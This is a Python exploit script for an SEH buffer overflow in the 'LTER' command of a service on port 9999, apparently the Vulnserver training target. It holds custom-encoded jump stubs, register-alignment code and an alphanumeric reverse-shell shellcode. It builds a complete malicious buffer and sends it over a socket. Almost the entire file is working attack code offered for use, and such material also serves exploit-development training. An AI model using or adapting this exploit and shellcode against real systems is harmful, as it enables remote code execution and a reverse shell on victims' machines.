#!/usr/bin/env python
#LTER SEH overflow
#Tested on Vista Enterprise SP2 32-bit and Windows 7 Professional SP1 32-bit
#Swap out JUMP1 and JUMP2 variables with WIN7JUMP1 and WIN7JUMP2. There are slight differences between the two that required changes when I was manipulating the registers to jump around.
#Bad characters: \x00\x0a\x0d\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

import socket
import time

#Custom encoded short jump upwards EB 80. Jumps from a 51 byte buffer to a 73 byte buffer above.
JUMP1 = ("\x54\x58\x2D\x62\x4F\x55\x55\x2D\x62\x4F\x55\x55\x2D\x62\x4F\x55\x55\x50\x5C\x56\x58\x2d\x2a\x6f\x35\x35\x2d\x41\x6f\x25\x36\x2d\x39\x31\x35\x25\x2d\x71\x6f\x6f\x6f\x50")
WIN7JUMP1 = ("\x54\x58\x2D\x20\x72\x55\x55\x2D\x20\x72\x55\x55\x2D\x66\x08\x55\x55\x50\x5C\x56\x58\x2D\x2A\x6F\x35\x35\x2D\x41\x6F\x25\x36\x2D\x39\x31\x35\x25\x2D\x71\x6F\x6F\x6F\x50")

#Points EBX to our 3000 byte buffer. Jumps to EBX
JUMP2 = ("\x56\x58\x54\x58\x2D\x43\x55\x55\x55\x2D\x74\x56\x55\x55\x2D\x7F\x54\x55\x55\x50\x5C\x56\x58\x55\x58\x2D\x52\x54\x55\x55\x2D\x52\x54\x55\x55\x2D\x52\x54\x55\x55\x50\x5B\x56\x58\x2D\x45\x45\x45\x45\x2D\x42\x55\x30\x37\x2D\x2A\x31\x39\x33\x2D\x50\x50\x50\x50\x50")
WIN7JUMP2 = ("\x56\x58\x54\x58\x2D\x43\x55\x55\x55\x2D\x74\x56\x55\x55\x2D\x7F\x54\x55\x55\x50\x5C\x56\x58\x55\x58\x2D\x33\x54\x55\x55\x2D\x33\x54\x55\x55\x2D\x0e\x53\x55\x55\x50\x5B\x56\x58\x2D\x45\x45\x45\x45\x2D\x42\x55\x30\x37\x2D\x2A\x31\x39\x33\x2D\x50\x50\x50\x50\x50")

#Alpha-numeric reverse shell. See https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/
SHELL2 = ("\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41"
"\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
"\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x6b"
"\x4c\x69\x78\x4c\x42\x33\x30\x45\x50\x47\x70\x35\x30"
"\x6c\x49\x6d\x35\x54\x71\x39\x50\x72\x44\x4e\x6b\x72"
"\x70\x44\x70\x4e\x6b\x52\x72\x36\x6c\x6e\x6b\x31\x42"
"\x32\x34\x6e\x6b\x33\x42\x54\x68\x46\x6f\x4f\x47\x73"
"\x7a\x47\x56\x35\x61\x59\x6f\x4e\x4c\x77\x4c\x33\x51"
"\x71\x6c\x64\x42\x34\x6c\x47\x50\x5a\x61\x4a\x6f\x34"
"\x4d\x53\x31\x79\x57\x49\x72\x4c\x32\x63\x62\x46\x37"
"\x6c\x4b\x72\x72\x66\x70\x6c\x4b\x52\x6a\x45\x6c\x6c"
"\x4b\x30\x4c\x76\x71\x42\x58\x7a\x43\x50\x48\x47\x71"
"\x4b\x61\x73\x61\x6e\x6b\x50\x59\x55\x70\x46\x61\x68"
"\x53\x4c\x4b\x71\x59\x62\x38\x68\x63\x44\x7a\x70\x49"
"\x4c\x4b\x37\x44\x4e\x6b\x36\x61\x69\x46\x56\x51\x39"
"\x6f\x4c\x6c\x4a\x61\x38\x4f\x36\x6d\x37\x71\x78\x47"
"\x50\x38\x4b\x50\x73\x45\x58\x76\x47\x73\x51\x6d\x38"
"\x78\x47\x4b\x31\x6d\x76\x44\x43\x45\x78\x64\x52\x78"
"\x4c\x4b\x36\x38\x67\x54\x67\x71\x69\x43\x43\x56\x4e"
"\x6b\x66\x6c\x42\x6b\x6c\x4b\x70\x58\x65\x4c\x67\x71"
"\x69\x43\x6e\x6b\x34\x44\x4e\x6b\x56\x61\x6a\x70\x6b"
"\x39\x61\x54\x65\x74\x44\x64\x53\x6b\x53\x6b\x31\x71"
"\x71\x49\x62\x7a\x70\x51\x39\x6f\x4b\x50\x33\x6f\x63"
"\x6f\x63\x6a\x4c\x4b\x67\x62\x5a\x4b\x6e\x6d\x61\x4d"
"\x45\x38\x66\x53\x34\x72\x47\x70\x55\x50\x53\x58\x52"
"\x57\x53\x43\x70\x32\x61\x4f\x36\x34\x35\x38\x50\x4c"
"\x34\x37\x66\x46\x36\x67\x39\x6f\x38\x55\x6d\x68\x6c"
"\x50\x47\x71\x75\x50\x53\x30\x54\x69\x69\x54\x56\x34"
"\x36\x30\x72\x48\x75\x79\x6b\x30\x62\x4b\x53\x30\x39"
"\x6f\x7a\x75\x46\x30\x36\x30\x56\x30\x30\x50\x47\x30"
"\x62\x70\x43\x70\x42\x70\x35\x38\x39\x7a\x46\x6f\x79"
"\x4f\x69\x70\x4b\x4f\x58\x55\x4f\x67\x31\x7a\x75\x55"
"\x71\x78\x4b\x70\x6f\x58\x34\x4a\x6e\x63\x32\x48\x54"
"\x42\x45\x50\x57\x71\x6d\x6b\x4b\x39\x79\x76\x43\x5a"
"\x44\x50\x53\x66\x32\x77\x32\x48\x6f\x69\x49\x35\x62"
"\x54\x65\x31\x39\x6f\x6b\x65\x6b\x35\x6f\x30\x33\x44"
"\x46\x6c\x69\x6f\x62\x6e\x67\x78\x72\x55\x48\x6c\x75"
"\x38\x78\x70\x38\x35\x6c\x62\x32\x76\x79\x6f\x38\x55"
"\x73\x58\x43\x53\x52\x4d\x45\x34\x45\x50\x6f\x79\x79"
"\x73\x76\x37\x72\x77\x71\x47\x64\x71\x4a\x56\x70\x6a"
"\x32\x32\x71\x49\x51\x46\x4a\x42\x49\x6d\x35\x36\x4f"
"\x37\x61\x54\x67\x54\x77\x4c\x47\x71\x46\x61\x6e\x6d"
"\x47\x34\x76\x44\x64\x50\x7a\x66\x75\x50\x37\x34\x46"
"\x34\x72\x70\x66\x36\x46\x36\x66\x36\x32\x66\x56\x36"
"\x72\x6e\x63\x66\x43\x66\x32\x73\x70\x56\x31\x78\x42"
"\x59\x58\x4c\x75\x6f\x6e\x66\x79\x6f\x6a\x75\x4b\x39"
"\x59\x70\x52\x6e\x71\x46\x72\x66\x69\x6f\x30\x30\x32"
"\x48\x74\x48\x6e\x67\x65\x4d\x55\x30\x39\x6f\x4a\x75"
"\x6d\x6b\x39\x6e\x44\x4e\x50\x32\x78\x6a\x30\x68\x6d"
"\x76\x4c\x55\x6d\x6d\x6f\x6d\x79\x6f\x6a\x75\x47\x4c"
"\x43\x36\x73\x4c\x35\x5a\x6b\x30\x4b\x4b\x4d\x30\x64"
"\x35\x54\x45\x4f\x4b\x47\x37\x37\x63\x50\x72\x30\x6f"
"\x43\x5a\x55\x50\x73\x63\x39\x6f\x4a\x75\x41\x41")

#Points ESP to where we will decode our second stage shellcode in our 73 byte buffer.
ESPALIGN = ("\x56\x58\x54\x58\x2D\x33\x5B\x55\x55\x2D\x33\x5B\x55\x55\x2D\x33\x5B\x55\x55\x48\x50\x5C")

#BufferRegister=ECX. See https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/
ECXALIGN = ("\x2D\x60\x60\x55\x55\x2D\x12\x70\x55\x55\x2D\x47\x2B\x55\x55\x48\x50\x59")

IP = "192.168.10.136" 
PORT = 9999
BUFFER_SIZE = 1024
#6250195e POP POP RETN
buffer = "LTER " + "." + "\x42" * 30 + ESPALIGN + ECXALIGN + "\x42" * 30 + SHELL2 + "\x42" * 2643 + JUMP2 + "\x42" * 9 + "\x4C\x4C\x77\x05" + "\x5e\x19\x50\x62" + "\x42" * 2  + JUMP1 + "\x42" * 5 + "\x42" * 1472

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
time.sleep(2);
s.send(buffer)
data = s.recv(BUFFER_SIZE)
s.close()
print "Buffer sent!"
